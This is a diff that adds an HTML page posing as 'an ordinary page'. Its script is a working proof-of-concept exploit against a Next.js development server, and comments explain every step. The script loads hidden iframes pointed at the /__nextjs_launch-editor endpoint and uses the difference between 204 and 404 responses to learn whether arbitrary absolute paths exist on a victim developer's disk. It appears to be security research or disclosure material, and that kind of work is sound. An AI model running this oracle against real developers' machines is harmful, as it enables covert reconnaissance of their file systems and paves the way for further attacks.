@@ -1,0 +1,56 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>attacker.test</title>
+<h1>Just an ordinary page</h1>
+<script>
+// Cross-site arbitrary-file-existence oracle against a developer's `next dev`.
+//
+// /__nextjs_launch-editor answers 204 (No Content) when the requested absolute
+// path exists on the developer's disk, and 404 when it does not. There is no
+// containment check of any kind on that path.
+//
+// A browser does not navigate a frame on a 204, but does on a 404. So:
+//   * point the frame at an attacker-origin blank page first;
+//   * then set src to the probe URL;
+//   * if the path EXISTS  -> 204 -> no navigation -> the frame still holds the
+//     attacker's own same-origin document, so contentWindow.document reads fine;
+//   * if the path is MISSING -> 404 -> the frame navigates to victimdev.test,
+//     becomes cross-origin, and the same read throws a SecurityError.
+//
+// The oracle is therefore deterministic (no timing) and needs no access to the
+// response body, so the Same-Origin Policy does not stand in the way.
+const VICTIM = 'http://victimdev.test:3020';
+
+function probe(absPath) {
+  return new Promise((resolve) => {
+    const f = document.createElement('iframe');
+    f.style.display = 'none';
+    f.src = '/blank.html';                        // attacker-origin document
+    f.addEventListener('load', function onBlank() {
+      f.removeEventListener('load', onBlank);
+      f.src = VICTIM + '/__nextjs_launch-editor?file=' + encodeURIComponent(absPath);
+      // One task later the navigation has either happened (404) or been
+      // abandoned (204). requestAnimationFrame + a micro delay is ample.
+      setTimeout(() => {
+        let exists;
+        try {
+          // Same-origin read succeeds only if the frame never navigated away.
+          void f.contentWindow.document.title;
+          exists = true;    // 204 No Content: the path exists
+        } catch (e) {
+          exists = false;   // cross-origin now: it navigated, so 404
+        }
+        f.remove();
+        resolve(exists);
+      }, 250);
+    });
+    document.body.appendChild(f);
+  });
+}
+
+window.runOracle = async function (paths) {
+  const out = {};
+  for (const p of paths) out[p] = await probe(p);
+  return out;
+};
+</script>
